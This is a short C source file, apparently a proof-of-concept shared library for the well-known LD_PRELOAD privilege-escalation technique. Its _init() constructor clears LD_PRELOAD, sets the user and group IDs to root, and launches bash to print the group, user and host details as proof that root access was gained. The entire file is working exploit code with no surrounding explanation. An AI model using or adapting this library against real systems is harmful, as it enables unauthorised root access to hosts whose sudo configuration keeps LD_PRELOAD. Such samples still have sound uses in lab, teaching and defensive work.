#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);

    char *bin = "/bin/bash";
    char *args[] = {bin, "-c",
                    "groups && id && hostname && whoami", "", NULL};
    char *const env[] = {NULL};
    execve(bin, args, env);
}